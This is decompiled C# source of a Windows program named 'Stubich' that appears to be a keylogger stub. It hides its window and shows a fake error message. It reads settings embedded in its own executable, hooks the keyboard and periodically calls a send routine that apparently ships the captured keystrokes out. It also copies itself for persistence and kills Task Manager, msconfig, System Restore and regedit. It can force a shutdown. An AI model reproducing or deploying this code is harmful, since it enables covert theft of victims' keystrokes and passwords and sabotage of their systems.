using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stubich;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("Label2")]
	private Label label_1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox textBox_1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox richTextBox_0;

	[AccessedThroughProperty("RichTextBox2")]
	private RichTextBox richTextBox_1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_2;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Label3")]
	private Label label_2;

	[AccessedThroughProperty("task")]
	private Label label_3;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("msconfig")]
	private Label label_4;

	[AccessedThroughProperty("backer")]
	private Label label_5;

	[AccessedThroughProperty("regedit")]
	private Label label_6;

	[AccessedThroughProperty("Timer4")]
	private Timer timer_3;

	[AccessedThroughProperty("Label17")]
	private Label label_7;

	[AccessedThroughProperty("Label4")]
	private Label label_8;

	[AccessedThroughProperty("Timer5")]
	private Timer timer_4;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private string string_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		Class7.wu3uG8qzm2R30();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new TextBox());
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new Label());
		vmethod_7(new Label());
		vmethod_9(new TextBox());
		vmethod_11(new RichTextBox());
		vmethod_13(new RichTextBox());
		vmethod_15(new TextBox());
		vmethod_17(new Timer(icontainer_0));
		vmethod_19(new Label());
		vmethod_21(new Label());
		vmethod_23(new Timer(icontainer_0));
		vmethod_25(new Label());
		vmethod_27(new Label());
		vmethod_29(new Label());
		vmethod_31(new Timer(icontainer_0));
		vmethod_33(new Label());
		vmethod_35(new Label());
		vmethod_37(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(0, 0);
		((Control)obj).set_Location(location);
		vmethod_0().set_Multiline(true);
		((Control)vmethod_0()).set_Name("TextBox1");
		TextBox obj2 = vmethod_0();
		Size size = new Size(462, 311);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_2().set_Enabled(true);
		vmethod_2().set_Interval(1);
		vmethod_4().set_AutoSize(true);
		Label obj3 = vmethod_4();
		location = new Point(12, 330);
		((Control)obj3).set_Location(location);
		((Control)vmethod_4()).set_Name("Label1");
		Label obj4 = vmethod_4();
		size = new Size(39, 13);
		((Control)obj4).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(1);
		vmethod_4().set_Text("Label1");
		vmethod_6().set_AutoSize(true);
		Label obj5 = vmethod_6();
		location = new Point(348, 330);
		((Control)obj5).set_Location(location);
		((Control)vmethod_6()).set_Name("Label2");
		Label obj6 = vmethod_6();
		size = new Size(39, 13);
		((Control)obj6).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(2);
		vmethod_6().set_Text("Label2");
		TextBox obj7 = vmethod_8();
		location = new Point(139, 323);
		((Control)obj7).set_Location(location);
		((Control)vmethod_8()).set_Name("TextBox4");
		TextBox obj8 = vmethod_8();
		size = new Size(180, 20);
		((Control)obj8).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(3);
		RichTextBox obj9 = vmethod_10();
		location = new Point(468, 102);
		((Control)obj9).set_Location(location);
		((Control)vmethod_10()).set_Name("RichTextBox1");
		RichTextBox obj10 = vmethod_10();
		size = new Size(100, 96);
		((Control)obj10).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(4);
		vmethod_10().set_Text("");
		RichTextBox obj11 = vmethod_12();
		location = new Point(468, 0);
		((Control)obj11).set_Location(location);
		((Control)vmethod_12()).set_Name("RichTextBox2");
		RichTextBox obj12 = vmethod_12();
		size = new Size(100, 96);
		((Control)obj12).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(5);
		vmethod_12().set_Text("");
		TextBox obj13 = vmethod_14();
		location = new Point(468, 204);
		((Control)obj13).set_Location(location);
		((Control)vmethod_14()).set_Name("TextBox2");
		TextBox obj14 = vmethod_14();
		size = new Size(191, 20);
		((Control)obj14).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(6);
		vmethod_16().set_Enabled(true);
		vmethod_16().set_Interval(1000);
		vmethod_18().set_AutoSize(true);
		Label obj15 = vmethod_18();
		location = new Point(468, 275);
		((Control)obj15).set_Location(location);
		((Control)vmethod_18()).set_Name("Label3");
		Label obj16 = vmethod_18();
		size = new Size(39, 13);
		((Control)obj16).set_Size(size);
		((Control)vmethod_18()).set_TabIndex(7);
		vmethod_18().set_Text("Label3");
		vmethod_20().set_AutoSize(true);
		Label obj17 = vmethod_20();
		location = new Point(557, 310);
		((Control)obj17).set_Location(location);
		((Control)vmethod_20()).set_Name("task");
		Label obj18 = vmethod_20();
		size = new Size(39, 13);
		((Control)obj18).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(8);
		vmethod_20().set_Text("Label4");
		vmethod_22().set_Enabled(true);
		vmethod_22().set_Interval(1);
		vmethod_24().set_AutoSize(true);
		Label obj19 = vmethod_24();
		location = new Point(597, 262);
		((Control)obj19).set_Location(location);
		((Control)vmethod_24()).set_Name("msconfig");
		Label obj20 = vmethod_24();
		size = new Size(39, 13);
		((Control)obj20).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(9);
		vmethod_24().set_Text("Label4");
		vmethod_26().set_AutoSize(true);
		Label obj21 = vmethod_26();
		location = new Point(504, 240);
		((Control)obj21).set_Location(location);
		((Control)vmethod_26()).set_Name("backer");
		Label obj22 = vmethod_26();
		size = new Size(39, 13);
		((Control)obj22).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(10);
		vmethod_26().set_Text("Label4");
		vmethod_28().set_AutoSize(true);
		Label obj23 = vmethod_28();
		location = new Point(620, 141);
		((Control)obj23).set_Location(location);
		((Control)vmethod_28()).set_Name("regedit");
		Label obj24 = vmethod_28();
		size = new Size(39, 13);
		((Control)obj24).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(11);
		vmethod_28().set_Text("Label4");
		vmethod_30().set_Enabled(true);
		vmethod_30().set_Interval(600000);
		vmethod_32().set_AutoSize(true);
		Label obj25 = vmethod_32();
		location = new Point(-407, 175);
		((Control)obj25).set_Location(location);
		((Control)vmethod_32()).set_Name("Label17");
		Label obj26 = vmethod_32();
		size = new Size(1926, 13);
		((Control)obj26).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(12);
		vmethod_32().set_Text(componentResourceManager.GetString("Label17.Text"));
		((Control)vmethod_32()).set_Visible(false);
		vmethod_34().set_AutoSize(true);
		Label obj27 = vmethod_34();
		location = new Point(574, 3);
		((Control)obj27).set_Location(location);
		((Control)vmethod_34()).set_Name("Label4");
		Label obj28 = vmethod_34();
		size = new Size(13, 13);
		((Control)obj28).set_Size(size);
		((Control)vmethod_34()).set_TabIndex(13);
		vmethod_34().set_Text("0");
		vmethod_36().set_Enabled(true);
		vmethod_36().set_Interval(1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(696, 351);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_34());
		((Control)this).get_Controls().Add((Control)(object)vmethod_32());
		((Control)this).get_Controls().Add((Control)(object)vmethod_28());
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.Transparent);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(TextBox WithEventsValue)
	{
		textBox_0 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_2()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_1;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = WithEventsValue;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_4()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(Label WithEventsValue)
	{
		label_0 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_6()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_7(Label WithEventsValue)
	{
		label_1 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_8()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_9(TextBox WithEventsValue)
	{
		textBox_1 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_10()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_11(RichTextBox WithEventsValue)
	{
		richTextBox_0 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual RichTextBox vmethod_12()
	{
		return richTextBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_13(RichTextBox WithEventsValue)
	{
		richTextBox_1 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_14()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_15(TextBox WithEventsValue)
	{
		textBox_2 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_16()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_17(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_2;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = WithEventsValue;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_18()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_19(Label WithEventsValue)
	{
		label_2 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_20()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_21(Label WithEventsValue)
	{
		label_3 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_22()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_23(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_3;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = WithEventsValue;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_24()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_25(Label WithEventsValue)
	{
		label_4 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_26()
	{
		return label_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_27(Label WithEventsValue)
	{
		label_5 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_28()
	{
		return label_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_29(Label WithEventsValue)
	{
		label_6 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_30()
	{
		return timer_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_31(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_4;
		if (timer_3 != null)
		{
			timer_3.remove_Tick(eventHandler);
		}
		timer_3 = WithEventsValue;
		if (timer_3 != null)
		{
			timer_3.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_32()
	{
		return label_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_33(Label WithEventsValue)
	{
		label_7 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_34()
	{
		return label_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_35(Label WithEventsValue)
	{
		label_8 = WithEventsValue;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_36()
	{
		return timer_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_37(Timer WithEventsValue)
	{
		EventHandler eventHandler = method_5;
		if (timer_4 != null)
		{
			timer_4.remove_Tick(eventHandler);
		}
		timer_4 = WithEventsValue;
		if (timer_4 != null)
		{
			timer_4.add_Tick(eventHandler);
		}
	}

	private object method_0(object object_0)
	{
		Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(object_0));
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
		object result = default(object);
		return result;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Visible(false);
		((Control)this).Hide();
		Interaction.MsgBox((object)"Eregar.dll Dosyası Bulunamadığından Program Sonlandırılacaktır !", (MsgBoxStyle)16, (object)"taskmgr.exe");
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		((Control)this).set_Width(0);
		((Control)this).set_Height(0);
		string_0 = "@cafe87@";
		try
		{
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			((Control)this).Hide();
			FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
			string text = Strings.Space(checked((int)FileSystem.LOF(1)));
			FileSystem.FileGet(1, ref text, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(text, string_0, -1, (CompareMethod)0);
			vmethod_4().set_Text(array[1]);
			vmethod_6().set_Text(array[2]);
			vmethod_20().set_Text(array[3]);
			vmethod_24().set_Text(array[4]);
			vmethod_26().set_Text(array[5]);
			vmethod_28().set_Text(array[6]);
			int_0 = Conversions.ToInteger(array[7]);
			int_1 = Conversions.ToInteger(array[8]);
			int_2 = Conversions.ToInteger(array[9]);
			int_3 = Conversions.ToInteger(array[10]);
			vmethod_16().Start();
			vmethod_2().Start();
			ozllk.Copy();
			ozllk.Baslat();
			ozllk.GorevSik();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			ProjectData.ClearProjectError();
		}
		((Control)this).set_Visible(false);
		((Control)this).Hide();
	}

	private void method_1(object sender, EventArgs e)
	{
		Tus.Klavyeyi_Dinlemeye_Al();
	}

	private void method_2(object sender, EventArgs e)
	{
		vmethod_34().set_Text(Conversions.ToString(Conversions.ToDouble(vmethod_34().get_Text()) + 1.0));
		if (Conversions.ToDouble(vmethod_34().get_Text()) == (double)checked(int_3 * 60))
		{
			vmethod_34().set_Text("0");
			vmethod_16().Stop();
			vmethod_2().Stop();
			ozllk.yolla();
			((TextBoxBase)vmethod_0()).Clear();
			vmethod_16().Start();
			vmethod_2().Start();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_20().get_Text(), "1", false) == 0)
		{
			ozllk.GorevSik();
			method_0("taskmgr.exe");
		}
		if (Operators.CompareString(vmethod_24().get_Text(), "1", false) == 0)
		{
			method_0("msconfig");
		}
		if (Operators.CompareString(vmethod_26().get_Text(), "1", false) == 0)
		{
			method_0("rstrui");
		}
		if (Operators.CompareString(vmethod_28().get_Text(), "1", false) == 0)
		{
			method_0("regedit");
		}
		if (int_0 == 1)
		{
			ozllk.Copy();
		}
		if (int_1 == 1)
		{
			ozllk.Baslat();
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		if (int_2 == 1)
		{
			Interaction.Shell("shutdown -s -t 0", (AppWinStyle)2, false, -1);
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		((Control)this).set_Width(0);
		((Control)this).set_Height(0);
	}
}
